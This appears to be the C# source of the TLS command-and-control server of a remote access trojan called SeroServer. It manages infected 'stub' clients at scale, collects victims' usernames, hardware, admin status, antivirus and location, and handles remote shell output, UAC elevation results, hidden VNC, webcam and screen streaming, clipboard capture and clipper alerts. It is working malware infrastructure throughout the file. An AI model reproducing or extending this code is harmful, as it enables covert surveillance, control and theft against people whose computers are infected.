using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using Newtonsoft.Json;
using SeroServer.Data;
using SeroServer.Protocol;
using SeroServer.UI;

namespace SeroServer.Net;

public class TlsServer
{
    private TcpListener? _listener;
    private X509Certificate2? _cert;
    private CancellationTokenSource? _cts;
    private readonly DataStore _store;
    private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(5) };
    private readonly ConcurrentDictionary<string, (string country, string code)> _countryCache = new();
    private System.Timers.Timer? _watchdogTimer;
    public int MaxConnectedClients { get; set; } = 100_000;

    public string AuthKey { get; set; } = string.Empty;
    public Func<string>? GetClientIdPrefix { get; set; }
    public ConcurrentDictionary<string, ConnectedClient> ConnectedClients { get; } = new();
    public event Action<ConnectedClient>? ClientConnected;
    public event Action<ConnectedClient>? ClientDisconnected;
    public event Action<string, string>? ShellOutputReceived;
    public event Action<string, string>? AutoTaskShellOutputReceived;
    public event Action<string, ElevationResultData>? ElevationResultReceived;
    public event Action<string, string>? RdpFrameReceived;      // clientId, rawJson
    public event Action<string, string>? WcamFrameReceived;     // clientId, rawJson
    public event Action<string, string>? RdpClipboardReceived;  // clientId, text
    public event Action<string, string>? HvncFrameReceived;     // clientId, rawJson
    public event Action<string, ClipperDetectedData>?     ClipperDetectedReceived;    // clientId, data
    public event Action<string, WindowNotifyAlertData>?   WindowNotifyAlertReceived;  // clientId, data
    public event Action<string>? OnLog;

    public bool IsRunning { get; private set; }
    public int  Port      { get; private set; }

    // Per-(client,packetType) dynamic handlers — used by feature windows
    private readonly ConcurrentDictionary<(string, PacketType), Action<Packet>> _handlers = new();

    // ── Rate limiting & auth-fail tracking ──────────────────────────────
    // Tracks (attempt_count, window_expiry) per IP for connection rate limiting
    private readonly ConcurrentDictionary<string, (int count, DateTime reset)> _connRate  = new();
    // Tracks consecutive auth failures per IP — temp-bans after 5 failures in 60s
    private readonly ConcurrentDictionary<string, (int fails, DateTime unbanAt)> _authFail = new();

    private const int MaxConnPerMinute  = 30;  // max new connections per IP per minute
    private const int MaxAuthFails      = 5;   // auth failures before 5-minute temp-ban

    private bool IsRateLimited(string ip)
    {
        var now = DateTime.UtcNow;
        _connRate.AddOrUpdate(ip,
            _ => (1, now.AddMinutes(1)),
            (_, v) => now > v.reset ? (1, now.AddMinutes(1)) : (v.count + 1, v.reset));
        return _connRate.TryGetValue(ip, out var r) && r.count > MaxConnPerMinute;
    }

    private bool IsTempBanned(string ip)
    {
        if (!_authFail.TryGetValue(ip, out var v)) return false;
        if (DateTime.UtcNow > v.unbanAt) { _authFail.TryRemove(ip, out _); return false; }
        return v.fails >= MaxAuthFails;
    }

    private void RecordAuthFailure(string ip)
    {
        var now = DateTime.UtcNow;
        _authFail.AddOrUpdate(ip,
            _ => (1, now.AddMinutes(5)),
            (_, v) =>
            {
                if (now > v.unbanAt) return (1, now.AddMinutes(5));
                return (v.fails + 1, now.AddMinutes(5)); // extend ban on each new failure
            });
        if (_authFail.TryGetValue(ip, out var r) && r.fails >= MaxAuthFails)
            Log($"[RATE] {ip} temp-banned for 5 min after {r.fails} auth failures.");
    }

    public void RegisterHandler(string clientId, PacketType type, Action<Packet> handler)
        => _handlers[(clientId, type)] = handler;

    public void UnregisterHandler(string clientId, PacketType type)
        => _handlers.TryRemove((clientId, type), out _);

    public TlsServer(DataStore store) => _store = store;

    public void Start(int port)
    {
        if (IsRunning) return;
        Port = port;

        _cert = CertificateHelper.GetOrCreateCertificate();
        _cts = new CancellationTokenSource();
        _listener = new TcpListener(IPAddress.Any, port);
        _listener.Start();
        IsRunning = true;

        Log($"[*] TLS Server started on port {port}");
        _ = AcceptLoop(_cts.Token);

        _watchdogTimer = new System.Timers.Timer(15_000) { AutoReset = true };
        _watchdogTimer.Elapsed += WatchdogTick;
        _watchdogTimer.Start();
    }

    private void WatchdogTick(object? sender, System.Timers.ElapsedEventArgs e)
    {
        // ConcurrentDictionary.Values enumeration is already thread-safe — ToList() not needed
        foreach (var client in ConnectedClients.Values)
        {
            if (!client.IsAlive)
            {
                Log($"[WATCHDOG] {client.Id} heartbeat timeout — disconnecting zombie.");
                DisconnectClient(client.Id);
            }
        }
    }

    public void Stop()
    {
        if (!IsRunning) return;
        _watchdogTimer?.Stop();
        _watchdogTimer?.Dispose();
        _watchdogTimer = null;
        _cts?.Cancel();
        _listener?.Stop();
        IsRunning = false;

        foreach (var client in ConnectedClients.Values.ToList())
        {
            try { client.Cts.Cancel(); client.Stream?.Close(); } catch { }
        }
        ConnectedClients.Clear();
        Log("[*] Server stopped.");
    }

    public async Task SendToClient(string clientId, Packet packet)
    {
        if (ConnectedClients.TryGetValue(clientId, out var client) && client.Stream != null)
        {
            // 8s timeout: prevents feature windows from hanging on dead clients
            // (watchdog detects them in ~12s anyway, this just unblocks senders faster)
            if (!await client.WriteLock.WaitAsync(TimeSpan.FromSeconds(8)))
            {
                DisconnectClient(clientId);
                return;
            }
            bool failed = false;
            try
            {
                // Re-check stream after acquiring lock — client may have disconnected.
                // Do NOT call Release() here: finally always runs and will release.
                if (client.Stream == null) return;
                await Packet.WriteToStreamAsync(client.Stream, packet);
            }
            catch { failed = true; }
            finally { client.WriteLock.Release(); }
            // Disconnect AFTER releasing lock to avoid deadlock with read loop
            if (failed) DisconnectClient(clientId);
        }
    }

    /// <summary>
    /// Sends HeartbeatAck followed by Ping under a single WriteLock acquisition.
    /// PingSentAt is captured AFTER acquiring the lock so queuing delay behind other
    /// outbound writes is excluded from the RTT measurement.
    /// </summary>
    private async Task SendHeartbeatAckAndPing(ConnectedClient client)
    {
        if (!await client.WriteLock.WaitAsync(TimeSpan.FromSeconds(8)))
        {
            DisconnectClient(client.Id);
            return;
        }
        bool failed = false;
        try
        {
            if (client.Stream == null) return;
            await Packet.WriteToStreamAsync(client.Stream, new Packet { Type = PacketType.HeartbeatAck });
            client.PingSentAt = DateTime.UtcNow;
            await Packet.WriteToStreamAsync(client.Stream, new Packet
            {
                Type = PacketType.Ping,
                Data = client.PingSentAt.Ticks.ToString()
            });
        }
        catch { failed = true; }
        finally { client.WriteLock.Release(); }
        if (failed) DisconnectClient(client.Id);
    }

    public Task SendToAll(Packet packet)
    {
        // Enumerate Values directly — no ToList() snapshot allocation
        var tasks = ConnectedClients.Values.Select(c => SendToClient(c.Id, packet));
        return Task.WhenAll(tasks);
    }

    public void DisconnectClient(string clientId)
    {
        if (ConnectedClients.TryRemove(clientId, out var client))
        {
            try { client.Cts.Cancel(); client.Stream?.Dispose(); } catch { }
            if (_store.AllClients.TryGetValue(client.Hwid, out var rec))
            {
                if (!string.IsNullOrEmpty(client.CpuName)) rec.LastCpuName = client.CpuName;
                if (!string.IsNullOrEmpty(client.GpuName)) rec.LastGpuName = client.GpuName;
                if (client.RamTotal > 0) { rec.LastRamUsed = client.RamUsed; rec.LastRamTotal = client.RamTotal; }
            }
            _store.RecordDisconnection(client.Hwid);
            Log($"[*] Client {client.Id} ({client.Username}@{client.IP}) disconnected.");
            // Purge feature-window handlers: try O(1) removes per known PacketType first,
            // then fall back to full scan only if stragglers remain (avoids O(n) at scale)
            foreach (PacketType pt in Enum.GetValues<PacketType>())
                _handlers.TryRemove((clientId, pt), out _);
            ClientDisconnected?.Invoke(client);
        }
    }

    // ── Private ─────────────────────────────────────

    private async Task AcceptLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var tcp = await _listener!.AcceptTcpClientAsync(ct);
                _ = HandleClient(tcp, ct);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex) { Log($"[!] Accept error: {ex.Message}"); }
        }
    }

    private async Task HandleClient(TcpClient tcp, CancellationToken serverCt)
    {
        tcp.NoDelay = true;
        var ep = tcp.Client.RemoteEndPoint as IPEndPoint;
        var ip = ep?.Address.ToString() ?? "?";
        ConnectedClient? client = null;

        // Rate limit: reject if IP is temp-banned or connecting too fast
        if (IsTempBanned(ip))
        {
            tcp.Close();
            return;
        }
        // Loopback is always a local tunnel proxy (localtonet, ngrok, etc.) — exempt from rate limiting.
        bool isLoopback = ip is "127.0.0.1" or "::1" or "localhost";
        if (!isLoopback && IsRateLimited(ip))
        {
            Log($"[RATE] {ip} rate-limited ({MaxConnPerMinute} connections/min exceeded).");
            tcp.Close();
            return;
        }

        SslStream? sslStream = null;
        try
        {
            sslStream = new SslStream(tcp.GetStream(), false);
            await sslStream.AuthenticateAsServerAsync(_cert!);

            // Wait for ClientInfo packet — 64 KB cap prevents pre-auth memory exhaustion
            var infoPacket = await Packet.ReadFromStreamAsync(sslStream, serverCt, maxPacketSize: 64 * 1024);
            if (infoPacket == null || infoPacket.Type != PacketType.ClientInfo)
            {
                Log($"[!] Client {ip} sent invalid handshake (expected ClientInfo, got {infoPacket?.Type}).");
                tcp.Close();
                return;
            }

            ClientInfoData? info;
            try { info = JsonConvert.DeserializeObject<ClientInfoData>(infoPacket.Data); }
            catch { info = null; }
            if (info == null)
            {
                Log($"[!] Client {ip} sent malformed ClientInfo JSON.");
                tcp.Close();
                return;
            }

            // Auth key verification — constant-time to prevent timing oracle
            var expectedBytes = System.Text.Encoding.UTF8.GetBytes(AuthKey ?? "");
            var receivedBytes = System.Text.Encoding.UTF8.GetBytes(info.AuthKey ?? "");
            bool authOk = expectedBytes.Length == receivedBytes.Length
                          && System.Security.Cryptography.CryptographicOperations.FixedTimeEquals(expectedBytes, receivedBytes);
            if (!authOk)
            {
                RecordAuthFailure(ip);
                Log($"[AUTH] Rejected {ip}: invalid auth key.");
                tcp.Close();
                return;
            }

            string clientId;
            bool knownHwid = _store.AllClients.TryGetValue(info.Hwid, out var existingRecord);
            // Reuse saved ID only when the prefix matches — a new build with a different
            // IdPrefix must get a fresh ID so the display updates correctly.
            bool reuseId = knownHwid
                && !string.IsNullOrEmpty(existingRecord!.AssignedId)
                && (string.IsNullOrEmpty(info.IdPrefix)
                    || existingRecord.AssignedId.StartsWith(info.IdPrefix + "-", StringComparison.Ordinal));

            if (reuseId)
            {
                clientId = existingRecord!.AssignedId;
            }
            else
            {
                var prefix = !string.IsNullOrEmpty(info.IdPrefix)
                    ? info.IdPrefix
                    : (!knownHwid ? GetClientIdPrefix?.Invoke() ?? "" : "");
                clientId = string.IsNullOrEmpty(prefix)
                    ? Guid.NewGuid().ToString("N")[..8]
                    : $"{prefix}-{Guid.NewGuid().ToString("N")[..8]}";
            }

            string displayIp = ip;
            if (!string.IsNullOrWhiteSpace(info.IP)
                && System.Net.IPAddress.TryParse(info.IP, out var parsedIp)
                && !System.Net.IPAddress.IsLoopback(parsedIp))
            {
                displayIp = info.IP;
            }

            client = new ConnectedClient
            {
                Id = clientId,
                Hwid = info.Hwid,
                InstanceId = info.InstanceId,
                Username = info.Username,
                IP = displayIp,
                OS = info.OS,
                MachineName = info.MachineName,
                IsAdmin = info.IsAdmin,
                Payload = info.Payload,
                Antivirus = info.Antivirus,
                Stream = sslStream,
                Port = Port,
            };

            // Resolve country from effective IP
            var (country, countryCode) = await ResolveCountryAsync(displayIp);
            client.Country = country;
            client.CountryCode = countryCode;
            FlagCache.QueueLoad(client, countryCode);

            // Restore tag + first seen from persistent record
            var record = _store.RecordConnection(client);
            client.Tag = record.Tag;
            client.FirstSeen = record.FirstSeen;

            // Persist the assigned ID (or overwrite when prefix changed)
            if (record.AssignedId != clientId)
                _store.SetAssignedId(client.Hwid, clientId);

            // Evict an existing connection from the same HWID only when it's the same build
            // (same IdPrefix). Two stubs with different IdPrefixes running on the same machine
            // are independent programs and must coexist in the client list.
            static string PrefixOf(string id) => id.Contains('-') ? id[..id.IndexOf('-')] : "";
            string newPfx   = info.IdPrefix ?? "";
            var stale = ConnectedClients.Values.FirstOrDefault(c =>
                c.Hwid == client.Hwid &&
                string.Equals(PrefixOf(c.Id), newPfx, StringComparison.Ordinal));

            // FIX: Add new client BEFORE disconnecting stale to avoid the race where the
            // UI sees a ClientDisconnected event with no matching ClientConnected afterwards.
            // Max clients check accounts for the fact that the stale slot is about to free up.
            int effectiveCount = ConnectedClients.Count - (stale != null ? 1 : 0);
            if (effectiveCount >= MaxConnectedClients)
            {
                Log($"[LIMIT] Rejected {ip} (max {MaxConnectedClients} clients reached).");
                tcp.Close();
                return;
            }

            ConnectedClients[client.Id] = client;
            if (stale != null)
                DisconnectClient(stale.Id);
            Log($"[+] Client {client.Id} connected ({info.Username}@{ip}, {client.Country})");
            ClientConnected?.Invoke(client);

            // No per-client watchdog task — _watchdogTimer (15s) handles zombie detection for all clients
            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(serverCt, client.Cts.Token);
            while (!linkedCts.Token.IsCancellationRequested)
            {
                var packet = await Packet.ReadFromStreamAsync(sslStream, linkedCts.Token);
                if (packet == null) break;

                switch (packet.Type)
                {
                    case PacketType.Heartbeat:
                        // Fire-and-forget via SendHeartbeatAckAndPing — keeps the read loop
                        // moving so the TCP receive buffer does not stall. The timestamp
                        // for the ping RTT is captured AFTER WriteLock acquisition (inside the
                        // async helper) so queuing delay behind other outbound packets does NOT
                        // inflate the reported ping.
                        client.LastHeartbeat = DateTime.UtcNow;
                        _ = SendHeartbeatAckAndPing(client);
                        break;

                    case PacketType.Pong:
                        if (long.TryParse(packet.Data, out long ticks))
                        {
                            var rtt = DateTime.UtcNow - new DateTime(ticks, DateTimeKind.Utc);
                            client.PingMs = (int)rtt.TotalMilliseconds;
                        }
                        break;

                    case PacketType.HardwareStats:
                        var hwStats = JsonConvert.DeserializeObject<HardwareStatsData>(packet.Data);
                        if (hwStats != null)
                        {
                            client.CpuUsage    = hwStats.CpuUsage;
                            client.RamUsed     = hwStats.RamUsed;
                            client.RamTotal    = hwStats.RamTotal;
                            client.IdleSeconds = hwStats.IdleSeconds;
                            if (!string.IsNullOrEmpty(hwStats.CpuName)) client.CpuName = hwStats.CpuName;
                            if (!string.IsNullOrEmpty(hwStats.GpuName)) client.GpuName = hwStats.GpuName;
                        }
                        break;

                    case PacketType.ClientInfo:
                        var updated = JsonConvert.DeserializeObject<ClientInfoData>(packet.Data);
                        if (updated != null)
                        {
                            client.OS = updated.OS;
                            client.MachineName = updated.MachineName;
                            client.IsAdmin = updated.IsAdmin;
                            if (!string.IsNullOrEmpty(updated.Payload))
                                client.Payload = updated.Payload;
                        }
                        break;

                    case PacketType.ShellOutput:
                        var shellData = JsonConvert.DeserializeObject<ShellOutputData>(packet.Data);
                        if (shellData != null)
                        {
                            _store.RecordActivity(client.Hwid, $"Shell output (exit={shellData.ExitCode})");
                            ShellOutputReceived?.Invoke(client.Id, shellData.Output);
                        }
                        break;

                    case PacketType.AutoTaskShellOutput:
                        var atShellData = JsonConvert.DeserializeObject<ShellOutputData>(packet.Data);
                        if (atShellData != null)
                            AutoTaskShellOutputReceived?.Invoke(client.Id, atShellData.Output);
                        break;

                    case PacketType.ElevationResult:
                        var elevData = JsonConvert.DeserializeObject<ElevationResultData>(packet.Data);
                        if (elevData != null)
                        {
                            _store.RecordActivity(client.Hwid, $"Elevation: {(elevData.Success ? "OK" : "FAILED")} - {elevData.Message}");
                            Log($"[UAC] {client.Id}: {(elevData.Success ? "Elevated" : "Failed")} - {elevData.Message}");
                            ElevationResultReceived?.Invoke(client.Id, elevData);
                        }
                        break;

                    case PacketType.ActiveWindow:
                        client.ActiveWindow = packet.Data;
                        break;
                    case PacketType.CameraStatus:
                        client.CameraStatus = packet.Data;
                        break;

                    case PacketType.RdpFrame:
                        // Try O(1) per-client handler first; fall back to broadcast event
                        if (_handlers.TryGetValue((client.Id, PacketType.RdpFrame), out var rdpH))
                            try { rdpH(packet); } catch { }
                        else
                            RdpFrameReceived?.Invoke(client.Id, packet.Data);
                        break;

                    case PacketType.WcamFrame:
                    case PacketType.WcamDevices:
                        WcamFrameReceived?.Invoke(client.Id, packet.Data);
                        break;

                    case PacketType.RdpClipboard:
                        if (_handlers.TryGetValue((client.Id, PacketType.RdpClipboard), out var rdpClipH))
                            try { rdpClipH(packet); } catch { }
                        else
                        {
                            var clipMsg = JsonConvert.DeserializeObject<RdpClipboardData>(packet.Data);
                            if (clipMsg != null && !string.IsNullOrEmpty(clipMsg.Text))
                                RdpClipboardReceived?.Invoke(client.Id, clipMsg.Text);
                        }
                        break;

                    case PacketType.HvncFrame:
                        if (_handlers.TryGetValue((client.Id, PacketType.HvncFrame), out var hvncH))
                            try { hvncH(packet); } catch { }
                        else
                            HvncFrameReceived?.Invoke(client.Id, packet.Data);
                        break;

                    case PacketType.ClipperDetected:
                        var clipDet = JsonConvert.DeserializeObject<ClipperDetectedData>(packet.Data);
                        if (clipDet != null)
                            ClipperDetectedReceived?.Invoke(client.Id, clipDet);
                        break;

                    case PacketType.WindowNotifyAlert:
                        var wnAlert = JsonConvert.DeserializeObject<WindowNotifyAlertData>(packet.Data);
                        if (wnAlert != null)
                            WindowNotifyAlertReceived?.Invoke(client.Id, wnAlert);
                        break;

                    default:
                        // Route to any dynamically registered handler (TCP/Startup/File/Mic/Fun windows)
                        if (_handlers.TryGetValue((client.Id, packet.Type), out var dynHandler))
                            try { dynHandler(packet); } catch { }
                        break;
                }
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex)
        {
            if (client is { PendingUninstall: true })
                Log($"[+] Client {client.Id} ({client.Username}@{ip}) uninstalled successfully.");
            else if (client != null
                  && ex is not System.IO.IOException          // normal TCP close — already logged as disconnect
                  && ex is not ObjectDisposedException        // stream disposed on disconnect
                  && !ex.Message.Contains("decryption operation failed", StringComparison.OrdinalIgnoreCase)
                  && !ex.Message.Contains("authentication failed", StringComparison.OrdinalIgnoreCase))
                Log($"[!] Client {client.Id} ({ip}) error: {ex.Message.Replace("\r\n", " ").Replace("\n", " ")}");
        }
        finally
        {
            try { sslStream?.Dispose(); } catch { }
            tcp.Close();
            if (client != null) DisconnectClient(client.Id);
        }
    }

    private static bool IsPrivateIp(System.Net.IPAddress addr)
    {
        var b = addr.GetAddressBytes();
        if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
            return b[0] == 10
                || (b[0] == 172 && b[1] >= 16 && b[1] <= 31)
                || (b[0] == 192 && b[1] == 168)
                || (b[0] == 169 && b[1] == 254); // link-local
        return false;
    }

    private static bool IsLocalOrPrivateIp(string ip)
    {
        if (string.IsNullOrEmpty(ip)) return true;
        if (!System.Net.IPAddress.TryParse(ip, out var addr)) return false;
        if (System.Net.IPAddress.IsLoopback(addr)) return true;
        if (addr.IsIPv4MappedToIPv6) addr = addr.MapToIPv4();
        var b = addr.GetAddressBytes();
        if (b.Length == 4)
            return b[0] == 10
                || b[0] == 127
                || (b[0] == 172 && b[1] is >= 16 and <= 31)
                || (b[0] == 192 && b[1] == 168)
                || (b[0] == 169 && b[1] == 254);   // APIPA link-local
        if (b.Length == 16)
            return (b[0] == 0xfe && (b[1] & 0xc0) == 0x80)  // fe80::/10 link-local
                || ((b[0] & 0xfe) == 0xfc);                   // fc00::/7 unique-local
        return false;
    }

    private async Task<(string country, string code)> ResolveCountryAsync(string ip)
    {
        if (IsLocalOrPrivateIp(ip))
        {
            bool isLoopback = string.IsNullOrEmpty(ip) || ip == "127.0.0.1" || ip == "::1"
                || (System.Net.IPAddress.TryParse(ip, out var a) && System.Net.IPAddress.IsLoopback(a));
            return isLoopback ? ("Localhost", "loc") : ("LAN", "lan");
        }

        // Fast path — already cached
        if (_countryCache.TryGetValue(ip, out var cached))
            return cached;

        try
        {
            // ip-api.com free plan only supports HTTP (HTTPS requires paid plan)
            var url  = $"http://ip-api.com/json/{ip}?fields=country,countryCode";
            var json = await _http.GetStringAsync(url);
            var obj  = JsonConvert.DeserializeObject<IpApiResponse>(json);
            var country = obj?.country ?? "Unknown";
            var code    = obj?.countryCode ?? "";
            var result  = (country, code);
            _countryCache.TryAdd(ip, result);
            return result;
        }
        catch
        {
            return ("Unknown", "");
        }
    }

    private void Log(string msg)
    {
        _store.Log(msg);
        OnLog?.Invoke(msg);
    }
}

// Typed response for ip-api.com — replaces DeserializeObject<dynamic>
file sealed class IpApiResponse
{
    public string? country     { get; set; }
    public string? countryCode { get; set; }
}
